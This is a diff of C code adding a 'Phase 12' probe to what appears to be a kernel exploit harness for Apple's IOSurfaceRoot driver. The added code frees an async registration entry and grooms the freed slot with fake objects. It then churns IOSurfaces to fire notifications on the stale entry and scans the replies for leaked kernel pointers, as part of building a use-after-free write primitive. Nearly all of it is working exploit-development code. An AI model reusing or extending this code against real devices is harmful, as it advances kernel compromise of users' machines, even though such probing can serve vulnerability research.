@@ -18570,6 +18570,309 @@ new_modes:
         phase11_done:
         rlog("--- Phase 11 complete ---\n");
 
+        /* ================================================================
+         * Phase 12: Notification-based write probe
+         * The PoC's write primitive fires through ASYNC NOTIFICATIONS,
+         * not through the dup oracle. When the render loop walks the
+         * registry, it may deliver a notification to the wake port of
+         * a stale (freed+groomed) entry. The notification dispatch
+         * reads from the groomed fake object fields.
+         *
+         * Test: set up stale entry with groom, run surface churn loop,
+         * then check if wake port received any messages.
+         * ================================================================ */
+        rlog("\n--- Phase 12: Notification trigger via surface churn ---\n");
+        {
+            io_service_t svc12 = IOServiceGetMatchingService(
+                kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
+            if (!svc12) { rlog("  Phase 12: service lookup failed\n"); goto phase12_done; }
+
+            io_connect_t c12 = IO_OBJECT_NULL, gc12 = IO_OBJECT_NULL;
+            IOServiceOpen(svc12, mach_task_self(), 0, &c12);
+            IOServiceOpen(svc12, mach_task_self(), 0, &gc12);
+            IOObjectRelease(svc12);
+            if (!c12 || !gc12) {
+                rlog("  Phase 12: open failed\n");
+                if (c12) IOServiceClose(c12);
+                if (gc12) IOServiceClose(gc12);
+                goto phase12_done;
+            }
+
+            uint64_t p12in[3] = {1, 2, 3};
+
+            /* 12a: Baseline — register, DON'T free, run churn, check wake port */
+            rlog("  12a: Baseline — live entry + surface churn → wake port check\n");
+            {
+                mach_port_t wp12 = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp12);
+                mach_port_insert_right(mach_task_self(), wp12, wp12, MACH_MSG_TYPE_MAKE_SEND);
+                uint64_t ref12 = 0x1122334455667788ULL;
+
+                IOConnectCallAsyncMethod(c12, 17, wp12, &ref12, 1,
+                    NULL, 0, p12in, 24, NULL, NULL, NULL, NULL);
+
+                /* Surface churn — create/destroy 500 surfaces */
+                for (int sc = 0; sc < 500; sc++) {
+                    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
+                        NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    int w = 32, h = 32, bpe = 4, bpr = w * bpe;
+                    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                    CFNumberRef nbpe = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                    CFNumberRef nbpr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                    uint32_t pf = 0x42475241;
+                    CFNumberRef npf = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nbpe);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
+                    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), npf);
+                    IOSurfaceRef cs = IOSurfaceCreate(props);
+                    if (cs) {
+                        CVPixelBufferRef pb = NULL;
+                        CVPixelBufferCreateWithIOSurface(NULL, cs, NULL, &pb);
+                        if (pb) CFRelease(pb);
+                        CFRelease(cs);
+                    }
+                    CFRelease(props); CFRelease(nw); CFRelease(nh);
+                    CFRelease(nbpe); CFRelease(nbpr); CFRelease(npf);
+                }
+
+                /* Drain wake port */
+                int msg_count = 0;
+                for (int m = 0; m < 50; m++) {
+                    uint8_t msg_buf[512];
+                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                    memset(msg_buf, 0, sizeof(msg_buf));
+                    hdr->msgh_size = sizeof(msg_buf);
+                    hdr->msgh_local_port = wp12;
+                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msg_buf), wp12, 10, MACH_PORT_NULL);
+                    if (mr == MACH_MSG_SUCCESS) {
+                        msg_count++;
+                        rlog("    baseline msg %d: id=0x%x size=%u",
+                             msg_count, hdr->msgh_id, hdr->msgh_size);
+                        /* Scan for kernel pointers */
+                        for (int off = 0; off + 8 <= (int)hdr->msgh_size && off < 256; off += 4) {
+                            uint64_t v = 0;
+                            memcpy(&v, msg_buf + off, 8);
+                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                if (v != 0xFFFFFFFFFFFFFFFFULL)
+                                    rlog(" KPTR@%d=0x%llx", off, (unsigned long long)v);
+                            }
+                        }
+                        rlog("\n");
+                    } else {
+                        break;
+                    }
+                }
+                rlog("    baseline msgs=%d\n", msg_count);
+
+                IOConnectCallMethod(c12, 18, NULL, 0, p12in, 24, NULL, NULL, NULL, NULL);
+                mach_port_deallocate(mach_task_self(), wp12);
+            }
+
+            /* 12b: Stale entry — register, dereg (free), groom, churn, check port */
+            rlog("  12b: Stale entry + groom + surface churn → wake port check\n");
+            {
+                mach_port_t wp12 = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp12);
+                mach_port_insert_right(mach_task_self(), wp12, wp12, MACH_MSG_TYPE_MAKE_SEND);
+                uint64_t ref12 = 0x1122334455667788ULL;
+
+                /* Register async entry with wake port */
+                IOConnectCallAsyncMethod(c12, 17, wp12, &ref12, 1,
+                    NULL, 0, p12in, 24, NULL, NULL, NULL, NULL);
+                /* Deregister — frees the entry */
+                IOConnectCallMethod(c12, 18, NULL, 0, p12in, 24,
+                    NULL, NULL, NULL, NULL);
+
+                /* Groom the freed slot */
+                uint8_t fbuf12[64];
+                memset(fbuf12, 0, sizeof(fbuf12));
+                uint64_t *f12 = (uint64_t *)fbuf12;
+                f12[0] = 0x21;
+                f12[1] = 0xBBBBBBBBBBBBBBBBULL;
+                f12[2] = 0xCCCCCCCCCCCCCCCCULL;
+
+                mach_port_t g_wps12[256];
+                int g_cnt12 = 0;
+                for (int gi = 0; gi < 256; gi++) {
+                    mach_port_t gwp = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                    mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                    uint64_t gref = 0xA1B2C3D4E5F60708ULL;
+                    g_wps12[gi] = MACH_PORT_NULL;
+                    kern_return_t gr = IOConnectCallAsyncMethod(gc12, 1000, gwp, &gref, 1,
+                        NULL, 0, fbuf12, 24, NULL, NULL, NULL, NULL);
+                    if (gr == 0 || gr == (kern_return_t)0xE00002C2) {
+                        g_wps12[gi] = gwp;
+                        g_cnt12++;
+                    } else {
+                        mach_port_deallocate(mach_task_self(), gwp);
+                    }
+                }
+                rlog("    groomed %d objects\n", g_cnt12);
+
+                /* Surface churn — 500 surfaces + CVPixelBuffer */
+                for (int sc = 0; sc < 500; sc++) {
+                    CFMutableDictionaryRef props = CFDictionaryCreateMutable(
+                        NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                        &kCFTypeDictionaryValueCallBacks);
+                    int w = 32, h = 32, bpe = 4, bpr = w * bpe;
+                    CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                    CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                    CFNumberRef nbpe = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                    CFNumberRef nbpr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                    uint32_t pf = 0x42475241;
+                    CFNumberRef npf = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceWidth"), nw);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceHeight"), nh);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerElement"), nbpe);
+                    CFDictionarySetValue(props, CFSTR("IOSurfaceBytesPerRow"), nbpr);
+                    CFDictionarySetValue(props, CFSTR("IOSurfacePixelFormat"), npf);
+                    IOSurfaceRef cs = IOSurfaceCreate(props);
+                    if (cs) {
+                        CVPixelBufferRef pb = NULL;
+                        CVPixelBufferCreateWithIOSurface(NULL, cs, NULL, &pb);
+                        if (pb) CFRelease(pb);
+                        CFRelease(cs);
+                    }
+                    CFRelease(props); CFRelease(nw); CFRelease(nh);
+                    CFRelease(nbpe); CFRelease(nbpr); CFRelease(npf);
+                }
+
+                /* Drain wake port for notifications */
+                int msg_count = 0;
+                for (int m = 0; m < 50; m++) {
+                    uint8_t msg_buf[512];
+                    mach_msg_header_t *hdr = (mach_msg_header_t *)msg_buf;
+                    memset(msg_buf, 0, sizeof(msg_buf));
+                    hdr->msgh_size = sizeof(msg_buf);
+                    hdr->msgh_local_port = wp12;
+                    kern_return_t mr = mach_msg(hdr, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                        0, sizeof(msg_buf), wp12, 10, MACH_PORT_NULL);
+                    if (mr == MACH_MSG_SUCCESS) {
+                        msg_count++;
+                        rlog("    stale msg %d: id=0x%x size=%u",
+                             msg_count, hdr->msgh_id, hdr->msgh_size);
+                        /* Full hex dump for analysis */
+                        for (int off = 0; off + 8 <= (int)hdr->msgh_size && off < 256; off += 8) {
+                            uint64_t v = 0;
+                            memcpy(&v, msg_buf + off, 8);
+                            if (v != 0)
+                                rlog(" [%d]=0x%llx", off, (unsigned long long)v);
+                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                if (v != 0xFFFFFFFFFFFFFFFFULL)
+                                    rlog("**KPTR**");
+                            }
+                            if (v == 0xBBBBBBBBBBBBBBBBULL) rlog("[GROOM-B]");
+                            if (v == 0xCCCCCCCCCCCCCCCCULL) rlog("[GROOM-C]");
+                        }
+                        rlog("\n");
+                    } else {
+                        break;
+                    }
+                }
+                rlog("    stale msgs=%d (if >0 from baseline, notification triggered on stale!)\n", msg_count);
+
+                /* Cleanup */
+                for (int gi = 0; gi < 256; gi++)
+                    if (g_wps12[gi]) mach_port_deallocate(mach_task_self(), g_wps12[gi]);
+                mach_port_deallocate(mach_task_self(), wp12);
+            }
+
+            /* 12c: Extended churn — 2000 surfaces at high rate with concurrent reg/dereg */
+            rlog("  12c: Extended churn (2000 surfaces) + stale entry\n");
+            {
+                mach_port_t wp12c = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp12c);
+                mach_port_insert_right(mach_task_self(), wp12c, wp12c, MACH_MSG_TYPE_MAKE_SEND);
+                uint64_t ref12c = 0x1122334455667788ULL;
+
+                /* 5 rounds with different timing */
+                int total_msgs = 0;
+                for (int round = 0; round < 5; round++) {
+                    /* Register */
+                    IOConnectCallAsyncMethod(c12, 17, wp12c, &ref12c, 1,
+                        NULL, 0, p12in, 24, NULL, NULL, NULL, NULL);
+                    /* Free */
+                    IOConnectCallMethod(c12, 18, NULL, 0, p12in, 24,
+                        NULL, NULL, NULL, NULL);
+                    /* Groom */
+                    uint8_t fb[64]; memset(fb, 0, sizeof(fb));
+                    uint64_t *ff = (uint64_t *)fb;
+                    ff[0] = 0x21; ff[1] = 0xAAAAAAAAAAAAAAAAULL; ff[2] = 0;
+                    mach_port_t gw[64];
+                    for (int gi = 0; gi < 64; gi++) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t gr2 = 0xA1B2C3D4E5F60708ULL;
+                        gw[gi] = MACH_PORT_NULL;
+                        kern_return_t gkr = IOConnectCallAsyncMethod(gc12, 1000, gwp, &gr2, 1,
+                            NULL, 0, fb, 24, NULL, NULL, NULL, NULL);
+                        if (gkr == 0 || gkr == (kern_return_t)0xE00002C2)
+                            gw[gi] = gwp;
+                        else
+                            mach_port_deallocate(mach_task_self(), gwp);
+                    }
+                    /* Fast churn */
+                    for (int sc = 0; sc < 400; sc++) {
+                        IOSurfaceRef cs = NULL;
+                        {
+                            CFMutableDictionaryRef p = CFDictionaryCreateMutable(
+                                NULL, 0, &kCFTypeDictionaryKeyCallBacks,
+                                &kCFTypeDictionaryValueCallBacks);
+                            int w = 16, h = 16, bpe = 4, bpr = w * bpe;
+                            CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+                            CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+                            CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+                            CFNumberRef nr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+                            uint32_t pf = 0x42475241;
+                            CFNumberRef np = CFNumberCreate(NULL, kCFNumberSInt32Type, &pf);
+                            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), nw);
+                            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), nh);
+                            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), nb);
+                            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), nr);
+                            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), np);
+                            cs = IOSurfaceCreate(p);
+                            CFRelease(p); CFRelease(nw); CFRelease(nh);
+                            CFRelease(nb); CFRelease(nr); CFRelease(np);
+                        }
+                        if (cs) CFRelease(cs);
+                    }
+                    /* Check port */
+                    int rmsg = 0;
+                    for (int m = 0; m < 10; m++) {
+                        uint8_t mb[256];
+                        mach_msg_header_t *h = (mach_msg_header_t *)mb;
+                        memset(mb, 0, sizeof(mb));
+                        h->msgh_size = sizeof(mb);
+                        h->msgh_local_port = wp12c;
+                        if (mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT,
+                            0, sizeof(mb), wp12c, 5, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
+                            rmsg++;
+                            rlog("    r%d msg: id=0x%x sz=%u\n", round, h->msgh_id, h->msgh_size);
+                        } else break;
+                    }
+                    total_msgs += rmsg;
+                    for (int gi = 0; gi < 64; gi++)
+                        if (gw[gi]) mach_port_deallocate(mach_task_self(), gw[gi]);
+                }
+                rlog("    total_msgs=%d across 5 rounds\n", total_msgs);
+                mach_port_deallocate(mach_task_self(), wp12c);
+            }
+
+            IOServiceClose(c12);
+            IOServiceClose(gc12);
+        }
+        phase12_done:
+        rlog("--- Phase 12 complete ---\n");
+
         rlog("\n=== IOSURFACE_SEL17 complete ===\n");
     }
 
